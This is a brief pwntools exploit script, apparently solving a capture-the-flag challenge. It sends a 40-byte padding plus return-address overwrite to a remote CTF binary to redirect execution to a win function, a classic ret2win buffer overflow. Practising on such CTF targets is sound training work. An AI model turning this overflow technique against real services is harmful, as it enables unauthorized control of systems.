from pwn import *

# Start the process (or connect via remote)
# p = process('./winner')
# or, if remote:
p = remote('pwn.kibsecctf.xfer.hr', 1338)

win_addr = 0x4018b5

payload = b"A" * 40           # fill buffer + saved rbp
payload += p64(win_addr)      # overwrite RIP

# Send first input
p.sendline(b"yes")

# Send overflow
p.sendline(payload)

# Interact or receive output
p.interactive()


#with open("pattern", "wb") as f:
 #   f.write(payload)

